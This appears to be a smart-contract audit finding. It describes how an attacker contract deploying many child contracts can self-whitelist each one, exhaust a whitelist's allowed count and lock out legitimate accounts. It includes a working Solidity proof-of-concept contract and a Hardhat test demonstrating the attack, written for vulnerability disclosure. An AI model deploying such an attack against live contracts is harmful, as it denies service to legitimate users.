# Vulnerability details

## Impact
A malicious user can increase `_whitelistCount` beyond `_allowedWhitelistIndex` in a single transaction.
So, the admin may not be able to set the number of whitelist account to a specific number, such as 1k.

## Proof of Concept
Any account, whether it's an externally owned account (EOA) or a contract address, can be self-whitelisted.
```
receive() external payable {
    if (_isSelfWhitelistDisabled) {
        revert SelfWhitelistDisabled();
    }
    if (_isBlacklisted[_msgSender()]) {
        revert Blacklisted();
    }
    _addWhitelistedAddress(_msgSender());
    payable(_msgSender()).transfer(msg.value);
}
```
A contract can create numerous child contracts, each of which becomes a whitelist account. Consequently, this contract can increase `_whitelistCount` to any desired extent.
As a result, no other account can become a whitelist account.
The admin can increase `_allowedWhitelistIndex`, but a malicious user can destroy this in a single transaction if `_allowedWhitelistIndex` isn't sufficiently large.
So, the admin cannot effectively control the number of whitelist accounts.

```
pragma solidity ^0.8.24;
pragma abicoder v2;

contract Whitelisting {
    constructor(address whitelist) {
        payable(whitelist).call{value: 0}("");
    }
}

contract WhitelistBroker {

    address immutable whitelist;

    constructor(address _whitelist) {
        whitelist = _whitelist;
    }

    function KillWhitelist(uint256 cnt) external {
        for (uint256 i = 0; i < cnt; i ++) {
            new Whitelisting(whitelist);
        }
    }
}
```

Following code should located in `"Self-whitelist"` scope.

```
it("Should self whitelist over 1k", async function () {
  const { whitelist, otherAccount } = await loadFixture(deployWhitelistFixture);
  expect(await whitelist.whitelistIndex(otherAccount)).to.eq(0);
  const balanceChange = 67335443339441n;

  await whitelist.setAllowedWhitelistIndex(10);
  
  const WhitelistBroker = await ethers.getContractFactory("WhitelistBroker");
  const whitelistbroker = await WhitelistBroker.connect(otherAccount).deploy(await whitelist.getAddress());
  
  await whitelistbroker.connect(otherAccount).KillWhitelist(10);
  
  expect(
    await otherAccount.sendTransaction({
      to: whitelist,
      value: ethers.parseEther("1"),
    }),
  ).to.changeEtherBalance(otherAccount, -balanceChange);
  expect(await whitelist.whitelistIndex(otherAccount) > 10).to.eq(true);
});
```
In this example, otherAccount can't become whitelist account.
